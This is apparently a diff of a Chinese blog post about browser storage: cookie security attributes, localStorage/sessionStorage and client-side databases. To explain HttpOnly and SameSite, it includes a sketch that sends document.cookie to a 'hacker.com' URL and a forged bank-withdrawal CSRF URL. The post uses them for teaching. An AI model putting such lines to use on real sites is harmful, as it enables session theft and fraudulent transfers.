-<h3 id="&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027;-Secure-HttpOnly"><a href="#&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027;-Secure-HttpOnly" class="headerlink" title="&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027; Secure / HttpOnly"></a>&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027; Secure / HttpOnly</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly;</code></p>
-<p> <strong>Secure</strong>&#x6307;&#x793A;&#x6D4F;&#x89C8;&#x5668;&#x4EC5;&#x901A;&#x8FC7; HTTPS &#x8FDE;&#x63A5;&#x4F20;&#x56DE; cookie&#xFF0C;&#x4EC5;&#x7528;&#x4E8E;HTTPS&#x7F51;&#x7AD9;&#x3002;</p>
-<p>&#x6CE8;&#x610F;&#xFF1A;Chrome 52 &#x3001;Firefox 52&#x4E4B;&#x524D;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x5373;&#x4F7F;&#x8BBE;&#x7F6E;&#x4E86;Secure&#xFF0C;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;HTTP&#x8FDB;&#x884C;&#x4F20;&#x8F93;&#xFF0C;&#x6240;&#x4EE5;&#x5373;&#x4F7F;&#x8BBE;&#x7F6E;&#x4E86;Secure&#xFF0C;&#x654F;&#x611F;&#x4FE1;&#x606F;&#x4F9D;&#x7136;&#x4E0D;&#x80FD;&#x5B58;&#x5728;cookie&#x91CC;&#x3002;</p>
-<p><strong>HttpOnly</strong>&#x8BBE;&#x7F6E;&#x4E86;HttpOnly&#x7684;Cookie&#x53EA;&#x80FD;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;JavaScript&#x8BBF;&#x95EE;&#xFF0C;&#x6709;&#x52A9;&#x4E8E;&#x9632;&#x6B62;cookie&#x52AB;&#x6301;&#x7C7B;XSS&#x653B;cookie&#x52AB;&#x6301;&#x7C7B;XSS&#x653B;&#x51FB;</p>
-<p><strong>cookie&#x52AB;&#x6301;&#x7C7B;XSS&#x653B;&#x51FB;</strong></p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_1.png" alt="&#x56FE;1_Xss&#x653B;&#x51FB;&#x56FE;&#x89E3;"></p>
+<h3 id="安全类属性-Secure-HttpOnly"><a href="#安全类属性-Secure-HttpOnly" class="headerlink" title="安全类属性 Secure / HttpOnly"></a>安全类属性 Secure / HttpOnly</h3><p><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly;</code></p>
+<p> <strong>Secure</strong>指示浏览器仅通过 HTTPS 连接传回 cookie，仅用于HTTPS网站。</p>
+<p>注意：Chrome 52 、Firefox 52之前的版本，即使设置了Secure，仍然可以通过HTTP进行传输，所以即使设置了Secure，敏感信息依然不能存在cookie里。</p>
+<p><strong>HttpOnly</strong>设置了HttpOnly的Cookie只能发送给服务器，不能通过JavaScript访问，有助于防止cookie劫持类XSS攻cookie劫持类XSS攻击</p>
+<p><strong>cookie劫持类XSS攻击</strong></p>
+<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_1.png" alt="图1_Xss攻击图解"></p>
 <p>var cookie = document.cookie;</p>
-<p>src=&#x2018;www.hacker.com?cookie=&#x2019; + cookie </p>
-<h3 id="&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027;-SameSite"><a href="#&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027;-SameSite" class="headerlink" title="&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027; SameSite"></a>&#x5B89;&#x5168;&#x7C7B;&#x5C5E;&#x6027; SameSite</h3><ol>
-<li>&#x8868;&#x660E;&#x8FD9;&#x4E2A; cookie &#x662F;&#x4E2A;&#x201C;&#x540C;&#x7AD9; cookie&#x201D;&#xFF0C;&#x540C;&#x7AD9; cookie &#x53EA;&#x80FD;&#x4F5C;&#x4E3A;&#x7B2C;&#x4E00;&#x65B9; cookie&#xFF0C;&#x4E0D;&#x80FD;&#x4F5C;&#x4E3A;&#x7B2C;&#x4E09;&#x65B9; cookie&#x3002;</li>
-<li>&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x9632;&#x8303;CSRF&#xFF08;Cross-Site Request Forgery&#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;&#xFF09;&#x653B;&#x51FB;</li>
+<p>src=‘<a href="http://www.hacker.com?cookie=’" target="_blank" rel="noopener">www.hacker.com?cookie=’</a> + cookie </p>
+<h3 id="安全类属性-SameSite"><a href="#安全类属性-SameSite" class="headerlink" title="安全类属性 SameSite"></a>安全类属性 SameSite</h3><ol>
+<li>表明这个 cookie 是个“同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。</li>
+<li>可以用来防范CSRF（Cross-Site Request Forgery跨站请求伪造）攻击</li>
 </ol>
-<p><strong>&#x7B2C;&#x4E09;&#x65B9;cookie</strong> </p>
-<p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;&#x7B2C;&#x4E09;&#x65B9;cookie&#x5C31;&#x662F;HTTP&#x8BF7;&#x6C42;&#x7684;Referer&#x503C;&#x548C;&#x8BF7;&#x6C42;&#x7684;&#x7F51;&#x5740;&#x57DF;&#x540D;&#x4E0D;&#x540C;</p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_2.png" alt="&#x56FE;2_&#x7B2C;&#x4E09;&#x65B9;cookie"></p>
-<p><strong>CSRF&#x653B;&#x51FB;&#x8FC7;&#x7A0B;</strong></p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_3.png" alt="&#x56FE;3_CSRF&#x653B;&#x51FB;"></p>
-<p>src=&#x2018;www.bankA.com/withdraw?money=1000&amp;to=hackerAccount&#x2019; </p>
-<p>IE&#x548C;Safari&#x5C1A;&#x4E0D;&#x652F;&#x6301;&#xFF0C;&#x5E76;&#x4E14;&#x8BA1;&#x5212;&#x7248;&#x672C;&#x4E2D;&#x4E5F;&#x6CA1;&#x6709;&#x52A0;&#x5165;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;</p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_4.png" alt="&#x56FE;4_sameSite&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;&#x60C5;&#x51B5;"></p>
-<h1 id="&#x4E8C;&#x3001;localStorage-sessionStorage"><a href="#&#x4E8C;&#x3001;localStorage-sessionStorage" class="headerlink" title="&#x4E8C;&#x3001;localStorage / sessionStorage"></a>&#x4E8C;&#x3001;localStorage / sessionStorage</h1><p>&#x5B83;&#x76F8;&#x5F53;&#x4E8E;&#x4E00;&#x4E2A;&#x7B80;&#x6613;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x4EE5;key/value&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x3002;</p>
-<h3 id="&#x533A;&#x522B;"><a href="#&#x533A;&#x522B;" class="headerlink" title="&#x533A;&#x522B;"></a>&#x533A;&#x522B;</h3><p>localStorage&#xFF1A;&#x4F1A;&#x4E00;&#x76F4;&#x4FDD;&#x5B58;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#xFF0C;&#x9664;&#x975E;&#x7528;&#x6237;&#x624B;&#x52A8;&#x6E05;&#x9664;<br>sessionStorage&#xFF1A;&#x5B58;&#x50A8;&#x4E8E;&#x6D4F;&#x89C8;&#x5668;&#x7AEF;&#xFF0C;<strong>&#x662F;Tab&#x7EA7;&#x522B;&#x7684;Session</strong> &#xFF0C;&#x5728;&#x65B0;&#x5F00;&#x7684;Tab&#x9875;&#x4E0B;&#xFF0C;&#x6216;&#x8005;&#x5173;&#x95ED;&#x672C;Tab&#x518D;&#x6253;&#x5F00;&#x540E;&#xFF0C;&#x90FD;&#x662F;&#x65E0;&#x6CD5;&#x8BBF;&#x95EE;&#x5230;&#x4E4B;&#x524D;&#x4FDD;&#x5B58;&#x7684;sessionStorage&#x7684;&#x3002;&#x4F46;&#x5982;&#x679C;&#x53EA;&#x662F;&#x5237;&#x65B0;Tab&#x9875;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x4E4B;&#x524D;&#x5B58;&#x50A8;&#x7684;Session<br>&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#x5747;&#x4EE5;localStorage&#x4F5C;&#x4F8B;&#x5B50;</p>
-<h3 id="&#x5B58;&#x50A8;&#x9650;&#x5236;"><a href="#&#x5B58;&#x50A8;&#x9650;&#x5236;" class="headerlink" title="&#x5B58;&#x50A8;&#x9650;&#x5236;"></a>&#x5B58;&#x50A8;&#x9650;&#x5236;</h3><p>HTML5&#x89C4;&#x8303;&#x5EFA;&#x8BAE;&#x5B58;&#x50A8;&#x4E0A;&#x9650;&#x4E3A;5MB&#xFF0C;&#x5404;&#x5BB6;&#x6D4F;&#x89C8;&#x5668;&#x5728;&#x5177;&#x4F53;&#x5B9E;&#x73B0;&#x65F6;&#x7684;&#x5B58;&#x50A8;&#x4E0A;&#x9650;&#x4E3A;&#x6BCF;&#x4E2A;&#x57DF;&#x540D;5M~10MB</p>
-<h3 id="&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;"><a href="#&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;" class="headerlink" title="&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;"></a>&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;</h3><p>IE8+/11&#x3001;Firefox 3.5+/57&#x3001;Chrome 4+/62&#x3001;Safari 4+/11&#x3001;Opera 11.5+/48</p>
-<h3 id="&#x7528;&#x9014;&#xFF1A;"><a href="#&#x7528;&#x9014;&#xFF1A;" class="headerlink" title="&#x7528;&#x9014;&#xFF1A;"></a>&#x7528;&#x9014;&#xFF1A;</h3><p>Web Storage&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5B58;&#x50A8;&#x7528;&#x6237;&#x7684;&#x64CD;&#x4F5C;&#x72B6;&#x6001;&#x3001;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x3001;&#x4F1A;&#x8BDD;&#x4FE1;&#x606F;&#x7B49;&#x3002;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x521B;&#x5EFA;&#x79BB;&#x7EBF;&#x4F7F;&#x7528;&#x7684;APP&#xFF0C;&#x7528;&#x6237;&#x79BB;&#x7EBF;&#x65F6;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x5728;&#x518D;&#x6B21;&#x8054;&#x7F51;&#x65F6;&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x505A;&#x4E00;&#x6B21;&#x6279;&#x91CF;&#x66F4;&#x65B0;&#x3002;</p>
-<h3 id="&#x5E38;&#x7528;API"><a href="#&#x5E38;&#x7528;API" class="headerlink" title="&#x5E38;&#x7528;API"></a>&#x5E38;&#x7528;API</h3><p>localStorage.setItem(keyName, keyValue);<br>localStorage.getItem(KeyName);<br>localStorage.removeItem(keyName) ;<br>localStorage.clear () ;<br>localStorage.length ;</p>
-<h3 id="Storage-Event"><a href="#Storage-Event" class="headerlink" title="Storage Event"></a>Storage Event</h3><p>&#x5F53;&#x5411;storage&#x4E2D;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x6216;&#x79FB;&#x9664;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;window&#x5BF9;&#x8C61;&#x4E0A;&#x89E6;&#x53D1;&#x4E00;&#x4E2A;<code>storage event</code>&#xFF0C;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x76D1;&#x542C;&#x5668;&#x8FDB;&#x884C;&#x76D1;&#x542C;&#x3002;</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&apos;storage&apos;</span>, storageEventHandler, <span class="literal">false</span>);</div></pre></td></tr></table></figure>
-<p><strong>&#x6CE8;&#x610F;</strong><br>&#x4E8B;&#x4EF6;&#x53EA;&#x80FD;&#x5728;&#x522B;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x7A97;&#x53E3;&#x76D1;&#x542C;&#x5230;&#xFF08;&#x4E0D;&#x662F;&#x4E8B;&#x4EF6;&#x88AB;&#x89E6;&#x53D1;&#x7684;&#x8FD9;&#x4E2A;&#x7A97;&#x53E3;&#xFF09;&#xFF0C;&#x5E76;&#x4E14;&#x5982;&#x679C;&#x6570;&#x636E;&#x6CA1;&#x6709;&#x6539;&#x53D8;&#x7684;&#x8BDD;&#xFF0C;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x4E8B;&#x4EF6;&#x3002;<br>&#x53EA;&#x5BF9;localStorage &#x7684;&#x6539;&#x53D8;&#x6709;&#x6548;&#xFF0C;&#x5BF9;sessionStorage&#x65E0;&#x6548;</p>
-<p><strong>&#x7528;&#x9014;&#xFF1A;</strong><br>&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5728;&#x4E0D;&#x540C;&#x9875;&#x9762;&#x95F4;&#x5B9E;&#x65F6;&#x540C;&#x6B65;&#x6570;&#x636E;&#xFF08;&#x76F8;&#x540C;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x4E0D;&#x540C;&#x7A97;&#x53E3;&#x95F4;&#xFF09;&#x3002;</p>
-<h3 id="&#x8D85;&#x51FA;&#x5B58;&#x50A8;&#x9650;&#x5236;&#xFF1A;"><a href="#&#x8D85;&#x51FA;&#x5B58;&#x50A8;&#x9650;&#x5236;&#xFF1A;" class="headerlink" title="&#x8D85;&#x51FA;&#x5B58;&#x50A8;&#x9650;&#x5236;&#xFF1A;"></a>&#x8D85;&#x51FA;&#x5B58;&#x50A8;&#x9650;&#x5236;&#xFF1A;</h3><p><strong>QUOTA_EXCEEDED_ERR</strong> &#xFF1A;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x5927;&#x5C0F;&#x8D85;&#x51FA;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x9650;&#x5236;&#x5C31;&#x4F1A;&#x629B;&#x51FA;&#x8FD9;&#x4E2A;&#x5F02;&#x5E38;<br>&#x6700;&#x4F73;&#x5B9E;&#x8DF5;&#x662F;&#xFF0C;&#x5F53;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x65F6;&#x4F7F;&#x7528;try/catch&#x5305;&#x88F9;&#x4EE3;&#x7801;&#x5757;&#x3002;</p>
+<p><strong>第三方cookie</strong> </p>
+<p>简单来说，第三方cookie就是HTTP请求的Referer值和请求的网址域名不同</p>
+<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_2.png" alt="图2_第三方cookie"></p>
+<p><strong>CSRF攻击过程</strong></p>
+<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_3.png" alt="图3_CSRF攻击"></p>
+<p>src=‘<a href="http://www.bankA.com/withdraw?money=1000&amp;to=hackerAccount’" target="_blank" rel="noopener">www.bankA.com/withdraw?money=1000&amp;to=hackerAccount’</a> </p>
+<p>IE和Safari尚不支持，并且计划版本中也没有加入这个功能</p>
+<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_4.png" alt="图4_sameSite的浏览器支持情况"></p>
+<h1 id="二、localStorage-sessionStorage"><a href="#二、localStorage-sessionStorage" class="headerlink" title="二、localStorage / sessionStorage"></a>二、localStorage / sessionStorage</h1><p>它相当于一个简易的客户端数据库，允许用户以key/value的形式存储数据。</p>
+<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>localStorage：会一直保存在浏览器中，除非用户手动清除<br>sessionStorage：存储于浏览器端，<strong>是Tab级别的Session</strong> ，在新开的Tab页下，或者关闭本Tab再打开后，都是无法访问到之前保存的sessionStorage的。但如果只是刷新Tab页，则可以访问之前存储的Session<br>以下内容均以localStorage作例子</p>
+<h3 id="存储限制"><a href="#存储限制" class="headerlink" title="存储限制"></a>存储限制</h3><p>HTML5规范建议存储上限为5MB，各家浏览器在具体实现时的存储上限为每个域名5M~10MB</p>
+<h3 id="浏览器支持"><a href="#浏览器支持" class="headerlink" title="浏览器支持"></a>浏览器支持</h3><p>IE8+/11、Firefox 3.5+/57、Chrome 4+/62、Safari 4+/11、Opera 11.5+/48</p>
+<h3 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h3><p>Web Storage可以用来存储用户的操作状态、用户信息、会话信息等。并且可以用来创建离线使用的APP，用户离线时存储的数据可以在再次联网时发送给服务器做一次批量更新。</p>
+<h3 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3><p>localStorage.setItem(keyName, keyValue);<br>localStorage.getItem(KeyName);<br>localStorage.removeItem(keyName) ;<br>localStorage.clear () ;<br>localStorage.length ;</p>
+<h3 id="Storage-Event"><a href="#Storage-Event" class="headerlink" title="Storage Event"></a>Storage Event</h3><p>当向storage中存储数据或移除数据时，会在window对象上触发一个<code>storage event</code>，可以添加监听器进行监听。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'storage'</span>, storageEventHandler, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>注意</strong><br>事件只能在别的浏览器窗口监听到（不是事件被触发的这个窗口），并且如果数据没有改变的话，不会触发事件。<br>只对localStorage 的改变有效，对sessionStorage无效</p>
+<p><strong>用途：</strong><br>可以用来在不同页面间实时同步数据（相同浏览器的不同窗口间）。</p>
+<h3 id="超出存储限制："><a href="#超出存储限制：" class="headerlink" title="超出存储限制："></a>超出存储限制：</h3><p><strong>QUOTA_EXCEEDED_ERR</strong> ：写入的数据大小超出浏览器的限制就会抛出这个异常<br>最佳实践是，当存储数据时使用try/catch包裹代码块。</p>
 <pre><code>function setSettings() {
       if (&apos;localStorage&apos; in window &amp;&amp; window[&apos;localStorage&apos;] !== null) {
           try {
@@ -457,23 +459,23 @@
           alert(&apos;Cannot store user preferences as your browser do not support local storage&apos;);
       }
 }
-</code></pre><h2 id="&#x4E09;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;"><a href="#&#x4E09;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="&#x4E09;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;"></a>&#x4E09;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;</h2><p>cookie&#x3001;sessionStorage&#x3001;localStorage&#x5BB9;&#x91CF;&#x8F83;&#x5C0F;&#xFF0C;&#x4E14;&#x53EA;&#x80FD;&#x5904;&#x7406;key-value&#x7ED3;&#x6784;&#x7684;&#x7B80;&#x5355;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#x5219;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#x3002;</p>
-<p><strong>&#x5305;&#x62EC;</strong> &#xFF1A;Web SQL Database  / IndexedDB</p>
-<p><strong>&#x8BBF;&#x95EE;</strong> &#xFF1A;&#x540C;&#x57DF;&#x540D;&#x4E0B;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x3002;</p>
-<p><strong>&#x5B58;&#x50A8;&#x65F6;&#x95F4;</strong> &#xFF1A;&#x6C38;&#x4E45;&#x5B58;&#x50A8;&#xFF0C;&#x9664;&#x975E;&#x7528;&#x6237;&#x624B;&#x52A8;&#x6E05;&#x9664;&#x6570;&#x636E;&#x3002;</p>
-<p><strong>&#x5927;&#x5C0F;&#x9650;&#x5236;</strong> &#xFF1A;&#x7406;&#x8BBA;&#x4E0A;&#x6CA1;&#x6709;&#x5927;&#x5C0F;&#x9650;&#x5236;&#xFF0C;&#x4F46;IndexedDB&#x7684;&#x6570;&#x636E;&#x5E93;&#x8D85;&#x8FC7;50M&#x7684;&#x65F6;&#x5019;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x5F39;&#x51FA;&#x786E;&#x8BA4;&#x3002;</p>
+</code></pre><h2 id="三、客户端数据库"><a href="#三、客户端数据库" class="headerlink" title="三、客户端数据库"></a>三、客户端数据库</h2><p>cookie、sessionStorage、localStorage容量较小，且只能处理key-value结构的简单的数据，而客户端数据库则可以解决这些问题。</p>
+<p><strong>包括</strong> ：Web SQL Database  / IndexedDB</p>
+<p><strong>访问</strong> ：同域名下可以访问。</p>
+<p><strong>存储时间</strong> ：永久存储，除非用户手动清除数据。</p>
+<p><strong>大小限制</strong> ：理论上没有大小限制，但IndexedDB的数据库超过50M的时候浏览器会弹出确认。</p>
 <h3 id="Web-SQL-Database"><a href="#Web-SQL-Database" class="headerlink" title="Web SQL Database"></a>Web SQL Database</h3><ol>
-<li>&#x53EF;&#x4EE5;&#x5904;&#x7406;&#x590D;&#x6742;&#x7684;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x4E14;&#x4F7F;&#x7528;SQL&#x8BED;&#x53E5;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;</li>
-<li><p>&#x56E0;&#x4E3A;&#x8FC7;&#x4E8E;&#x4F9D;&#x8D56;&#x540E;&#x7AEF;SQL&#x8BED;&#x8A00;&#x7684;&#x8BED;&#x6CD5;&#xFF0C;<strong>&#x5DF2;&#x88AB;Web&#x5E94;&#x7528;&#x5DE5;&#x4F5C;&#x7EC4;&#x5E9F;&#x5F03;</strong> &#xFF0C;&#x4F46;&#x5728;&#x624B;&#x673A;&#x7AEF;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x7684;&#x7684;&#x652F;&#x6301;&#x7387;&#x4ECD;&#x7136;&#x8F83;&#x9AD8;</p>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_5.png" alt="&#x56FE;5_Web SQL Database&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;&#x60C5;&#x51B5;"></p>
+<li>可以处理复杂的关系型数据，并且使用SQL语句进行操作</li>
+<li><p>因为过于依赖后端SQL语言的语法，<strong>已被Web应用工作组废弃</strong> ，但在手机端浏览器中的的支持率仍然较高</p>
+<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_5.png" alt="图5_Web SQL Database浏览器支持情况"></p>
 </li>
 </ol>
-<p><strong>&#x4E09;&#x4E2A;&#x6838;&#x5FC3;&#x65B9;&#x6CD5;&#xFF1A;</strong><br>openDatabase&#xFF1A;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x8C61;<br>transaction&#xFF1A;&#x7528;&#x4E8E;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x63A7;&#x5236;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;<br>executeSql&#xFF1A;&#x7528;&#x4E8E;&#x6267;&#x884C;SQL &#x67E5;&#x8BE2;</p>
+<p><strong>三个核心方法：</strong><br>openDatabase：创建数据库对象<br>transaction：用于根据情况控制事务提交或回滚<br>executeSql：用于执行SQL 查询</p>
 <h3 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h3><ol>
-<li>IndexedDB&#x66F4;&#x50CF;&#x662F;NoSQL&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;JS&#x7684;&#x65B9;&#x6CD5;&#x64CD;&#x4F5C;&#x6570;&#x636E;</li>
-<li>&#x5927;&#x90E8;&#x5206;&#x6D4F;&#x89C8;&#x5668;&#x90FD;&#x5DF2;&#x652F;&#x6301;&#x6216;&#x652F;&#x6301;&#x90E8;&#x5206;&#x529F;&#x80FD;</li>
+<li>IndexedDB更像是NoSQL，可以直接使用JS的方法操作数据</li>
+<li>大部分浏览器都已支持或支持部分功能</li>
 </ol>
-<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_6.png" alt="&#x56FE;6_indexedDB&#x6D4F;&#x89C8;&#x5668;&#x652F;&#x6301;&#x60C5;&#x51B5;"></p>
+<p><img src="http://o798x2hdw.bkt.clouddn.com//storage_in_frontend/storage_in_frontend_6.png" alt="图6_indexedDB浏览器支持情况"></p>
 
       
     </div>
@@ -512,8 +514,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/04/02/TCP-IP/" rel="prev" title="TCP/IP入门经典_笔记">
-                TCP/IP入门经典_笔记 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/03/02/HTTP_cache/" rel="prev" title="HTTP缓存机制大局观">
+                HTTP缓存机制大局观 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -589,7 +591,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">17</span>
+              <span class="site-state-item-count">18</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -597,7 +599,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-count">7</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -606,7 +608,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">34</span>
+                <span class="site-state-item-count">35</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
